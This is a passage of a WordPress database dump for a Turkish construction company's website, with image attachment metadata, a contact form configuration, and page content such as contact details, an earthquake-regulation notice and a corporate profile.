INSERT INTO `cmrfu_postmeta` VALUES("2089","982","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:25:\"2014/08/serifoglu-011.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:25:\"serifoglu-011-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:25:\"serifoglu-011-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:23:\"serifoglu-011-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2090","983","_wp_attached_file","2014/08/seyithanoglu_ahsap.png");
INSERT INTO `cmrfu_postmeta` VALUES("2091","983","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:30:\"2014/08/seyithanoglu_ahsap.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:30:\"seyithanoglu_ahsap-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:30:\"seyithanoglu_ahsap-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:28:\"seyithanoglu_ahsap-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2092","984","_wp_attached_file","2014/08/tepe_insaat_malzemeleri.png");
INSERT INTO `cmrfu_postmeta` VALUES("2093","984","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:35:\"2014/08/tepe_insaat_malzemeleri.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:35:\"tepe_insaat_malzemeleri-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:35:\"tepe_insaat_malzemeleri-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:33:\"tepe_insaat_malzemeleri-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2094","985","_wp_attached_file","2014/08/Winsa-011.png");
INSERT INTO `cmrfu_postmeta` VALUES("2095","985","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:21:\"2014/08/Winsa-011.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:21:\"Winsa-011-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:21:\"Winsa-011-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:19:\"Winsa-011-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2096","986","_wp_attached_file","2014/08/yuksel_elektrik.png");
INSERT INTO `cmrfu_postmeta` VALUES("2097","986","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:27:\"2014/08/yuksel_elektrik.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"yuksel_elektrik-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"yuksel_elektrik-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:25:\"yuksel_elektrik-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2098","988","_wp_attached_file","2014/08/ege_seramik.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2099","988","_wp_attachment_metadata","a:5:{s:5:\"width\";i:250;s:6:\"height\";i:69;s:4:\"file\";s:23:\"2014/08/ege_seramik.jpg\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:22:\"ege_seramik-150x69.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:69;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:22:\"ege_seramik-170x69.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:69;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:21:\"ege_seramik-85x69.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:69;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2100","989","_wp_attached_file","2014/08/franke.gif");
INSERT INTO `cmrfu_postmeta` VALUES("2101","989","_wp_attachment_metadata","a:5:{s:5:\"width\";i:130;s:6:\"height\";i:42;s:4:\"file\";s:18:\"2014/08/franke.gif\";s:5:\"sizes\";a:1:{s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"franke-85x42.gif\";s:5:\"width\";i:85;s:6:\"height\";i:42;s:9:\"mime-type\";s:9:\"image/gif\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2102","990","_wp_attached_file","2014/08/mitsubishi_klima.png");
INSERT INTO `cmrfu_postmeta` VALUES("2103","990","_wp_attachment_metadata","a:5:{s:5:\"width\";i:228;s:6:\"height\";i:75;s:4:\"file\";s:28:\"2014/08/mitsubishi_klima.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:27:\"mitsubishi_klima-150x75.png\";s:5:\"width\";i:150;s:6:\"height\";i:75;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:27:\"mitsubishi_klima-170x75.png\";s:5:\"width\";i:170;s:6:\"height\";i:75;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:26:\"mitsubishi_klima-85x75.png\";s:5:\"width\";i:85;s:6:\"height\";i:75;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2104","993","_wp_attached_file","2014/08/logo.png");
INSERT INTO `cmrfu_postmeta` VALUES("2105","993","_wp_attachment_metadata","a:5:{s:5:\"width\";i:89;s:6:\"height\";i:90;s:4:\"file\";s:16:\"2014/08/logo.png\";s:5:\"sizes\";a:1:{s:11:\"recent-post\";a:4:{s:4:\"file\";s:14:\"logo-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2106","995","_form","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Telefon (gerekli)<br />
    [tel* tel-876] </p>

<p>Adres<br />
    [textarea textarea-659]</p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-357 size:m] [captchar captcha-357]</p>

<p>[submit \"Gönder\"]</p>");
INSERT INTO `cmrfu_postmeta` VALUES("2107","995","_mail","a:8:{s:7:\"subject\";s:20:\"Bina Yenileme Talebi\";s:6:\"sender\";s:19:\"info@herkonyapi.com\";s:4:\"body\";s:216:\"Kimden: [your-name] <[your-email]>
Email: [your-email]
Telefon: [tel-876]

Adres:
[textarea-659]

İleti:
[your-message]

--
Bu e-posta Herkon Yapı (http://herkonyapi.com) adresindeki iletişim formundan gönderildi\";s:9:\"recipient\";s:19:\"info@herkonyapi.com\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:1;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("2108","995","_mail_2","a:9:{s:6:\"active\";b:0;s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:127:\"İleti Gövdesi:
[your-message]

--
Bu e-posta Herkon Yapı (http://herkonyapi.com) adresindeki iletişim formundan gönderildi\";s:9:\"recipient\";s:12:\"[your-email]\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("2109","995","_messages","a:21:{s:12:\"mail_sent_ok\";s:56:\"İletiniz başarılı olarak gönderildi. Teşekkürler.\";s:12:\"mail_sent_ng\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:16:\"validation_error\";s:85:\"Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.\";s:4:\"spam\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:12:\"accept_terms\";s:48:\"İlerlemek için lütfen koşulları kabul edin.\";s:16:\"invalid_required\";s:35:\"Lütfen gerekli alanları doldurun.\";s:17:\"captcha_not_match\";s:30:\"Girdiğiniz kod doğru değil.\";s:14:\"invalid_number\";s:37:\"Sayı biçimi geçersiz görünüyor.\";s:16:\"number_too_small\";s:23:\"Bu sayı çok küçük.\";s:16:\"number_too_large\";s:22:\"Bu sayı çok büyük.\";s:13:\"invalid_email\";s:37:\"Eposta adresi geçersiz görünüyor.\";s:11:\"invalid_url\";s:27:\"URL geçersiz görünüyor.\";s:11:\"invalid_tel\";s:41:\"Telefon numarası geçersiz görünüyor.\";s:23:\"quiz_answer_not_correct\";s:27:\"Yanıtınız doğru değil.\";s:12:\"invalid_date\";s:37:\"Tarih biçimi geçersiz görünüyor.\";s:14:\"date_too_early\";s:20:\"Bu tarih çok erken.\";s:13:\"date_too_late\";s:19:\"Bu tarih çok geç.\";s:13:\"upload_failed\";s:29:\"Dosya gönderme başarısız.\";s:24:\"upload_file_type_invalid\";s:34:\"Bu dosya türüne izin verilmiyor.\";s:21:\"upload_file_too_large\";s:22:\"Bu dosya çok büyük.\";s:23:\"upload_failed_php_error\";s:49:\"Dosya gönderme başarısız. Hata meydana geldi.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2110","995","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("2111","995","_locale","tr_TR");
INSERT INTO `cmrfu_postmeta` VALUES("2112","997","_wp_attached_file","2014/08/4.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2113","997","_wp_attachment_metadata","a:5:{s:5:\"width\";i:500;s:6:\"height\";i:707;s:4:\"file\";s:13:\"2014/08/4.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"4-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"4-212x300.jpg\";s:5:\"width\";i:212;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"4-500x230.jpg\";s:5:\"width\";i:500;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"4-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"4-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"4-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2195","524","_yoast_wpseo_content_score","90");


DROP TABLE IF EXISTS `cmrfu_posts`;

CREATE TABLE `cmrfu_posts` (
  `ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `post_author` bigint(20) unsigned NOT NULL DEFAULT '0',
  `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_title` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_excerpt` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'publish',
  `comment_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `ping_status` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'open',
  `post_password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `post_name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `to_ping` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `pinged` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content_filtered` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `post_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `guid` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `menu_order` int(11) NOT NULL DEFAULT '0',
  `post_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'post',
  `post_mime_type` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_count` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`ID`),
  KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
  KEY `post_parent` (`post_parent`),
  KEY `post_author` (`post_author`),
  KEY `post_name` (`post_name`(191))
) ENGINE=MyISAM AUTO_INCREMENT=1054 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_posts` VALUES("4","1","2014-02-19 19:27:44","2014-02-19 17:27:44","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-897 size:m] [captchar captcha-897]</p>

<p>[submit \"Gönder\"]</p>
Herkon İletişim Formu
info@herkonyapi.com
isim: [your-name]

email: [your-email]

konu: [your-subject]

ileti: [your-message]
info@herkonyapi.com


1










İletiniz başarılı olarak gönderildi. Teşekkürler.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
İlerlemek için lütfen koşulları kabul edin.
Lütfen gerekli alanları doldurun.
Girdiğiniz kod doğru değil.
Sayı biçimi geçersiz görünüyor.
Bu sayı çok küçük.
Bu sayı çok büyük.
Eposta adresi geçersiz görünüyor.
URL geçersiz görünüyor.
Telefon numarası geçersiz görünüyor.
Yanıtınız doğru değil.
Tarih biçimi geçersiz görünüyor.
Bu tarih çok erken.
Bu tarih çok geç.
Dosya gönderme başarısız.
Bu dosya türüne izin verilmiyor.
Bu dosya çok büyük.
Dosya gönderme başarısız. Hata meydana geldi.","İletişim formu 1","","publish","open","open","","iletisim-formu-1","","","2014-09-02 09:32:23","2014-09-02 06:32:23","","0","http://herkonyapi.com/?post_type=wpcf7_contact_form&#038;p=4","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("804","1","2014-02-19 20:51:37","2014-02-19 18:51:37","","517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350","","inherit","open","open","","517_residential_integral-construction-mtn-view-road-home-jpg-960x350","","","2014-02-19 20:51:37","2014-02-19 18:51:37","","0","http://herkonyapi.com/wp-content/uploads/2014/02/517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("929","1","2014-08-29 22:26:13","2014-08-29 19:26:13","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Nüshetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]

[list_item icon=\"phone-sign\"]+90 532 255 15 90[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-08-29 22:26:13","2014-08-29 19:26:13","","447","http://herkonyapi.com/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("927","1","2014-06-02 14:36:17","2014-06-02 11:36:17","","slide3","","inherit","open","open","","slide3","","","2014-06-02 14:36:17","2014-06-02 11:36:17","","0","http://herkonyapi.com/wp-content/uploads/2014/06/slide3.png","0","attachment","image/png","0");
INSERT INTO `cmrfu_posts` VALUES("11","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Features","","publish","open","open","","features-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://herkonyapi.com/features-2/","5","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("12","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Shortcodes","","publish","open","open","","shortcodes-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://herkonyapi.com/shortcodes-2/","9","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("13","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Page","","publish","open","open","","page-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://herkonyapi.com/page-2/","31","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("14","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Portfolio","","publish","open","open","","portfolio-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://herkonyapi.com/portfolio-2/","38","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("1042","1","2014-10-06 15:33:35","2014-10-06 12:33:35","Çevre ve Şehircilik Bakanlığı, İstanbul\'da bina yönetmelikleri ile ilgili olarak İnşaat Mühendislerine eğitim veriyor. Bu deprem eğitimleri Eskişehir, Samsun, Nevşehir, Trabzon, Çanakkale, Gaziantep ve İzmir\'de de veriliyor.

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/03/20070306-3.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında esaslar, 6 Mart 2007 Salı günü 26454 sayılı Resmi Gazete\'de yayınlandı.</a>

<a href=\"http://www.resmigazete.gov.tr/eskiler/2007/05/20070503-8.htm\" target=\"_blank\">Deprem bölgelerinde yapılacak binalar hakkında yönetmelikte değişiklik yapılmasına ilişkin yönetmelik, 3 Mayıs 2007 tarihinde ve 26511 sayılı Resmi Gazete\'de yayınlandı.</a>
<p style=\"text-align: center;\"><a href=\"http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png\"><img class=\"size-full wp-image-940 aligncenter\" alt=\"deprem-gercegi\" src=\"http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png\" width=\"683\" height=\"882\" /></a></p>","Deprem Tedbirleri","","inherit","open","open","","939-revision-v1","","","2014-10-06 15:33:35","2014-10-06 12:33:35","","939","http://herkonyapi.com/939-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("447","1","2013-10-12 02:06:02","2013-10-12 02:06:02","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]

[list_item icon=\"phone-sign\"]+90 532 255 15 90[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","publish","closed","closed","","iletisim","","","2014-08-29 22:28:33","2014-08-29 19:28:33","","0","http://localhost/leaf/wordpress/?page_id=447","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("912","1","2014-06-02 13:49:34","2014-06-02 10:49:34","[cols]
[col-8]
<h4></h4>
[contact-form-7 id=\"446\" title=\"Contact form 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Refik Osman Top Sok. Maçka İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 222 10 10[/list_item]
[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-06-02 13:49:34","2014-06-02 10:49:34","","447","http://herkonyapi.com/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("819","1","2014-02-20 09:20:46","2014-02-20 07:20:46","[cols]
[col-8]
<h4>Get in touch</h4>
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Debitis, sint totam facere deleniti ad a quidem omnis molestiae consectetur ratione. Commodi porro totam animi alias corporis nemo asperiores consectetur quos.
[contact-form-7 id=\"446\" title=\"Contact form 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]100 Mainstreet Blvd[/list_item]
[list_item icon=\"envelope\"]hello@everislabs.com[/list_item]
[list_item icon=\"phone-sign\"]1900-1580-EVERIS[/list_item]
[/list]

[notification class=\"top-20\" type=\"notice\" close=\"true/false\"]

Debitis, sint totam facere deleniti ad a quidem omnis molestiae consectetur ratione.

[/notification]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-02-20 09:20:46","2014-02-20 07:20:46","","447","http://herkonyapi.com/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("454","1","2013-10-12 07:32:12","2013-10-12 07:32:12","","Duyurular","","publish","closed","closed","","blog","","","2014-06-02 14:15:14","2014-06-02 11:15:14","","0","http://localhost/leaf/wordpress/?page_id=454","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("497","1","2013-10-12 11:34:55","2013-10-12 11:34:55","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Kurumsal","","publish","closed","closed","","kurumsal","","","2014-08-29 22:29:35","2014-08-29 19:29:35","","0","http://localhost/leaf/wordpress/?page_id=497","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("911","1","2014-06-02 13:45:39","2014-06-02 10:45:39","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

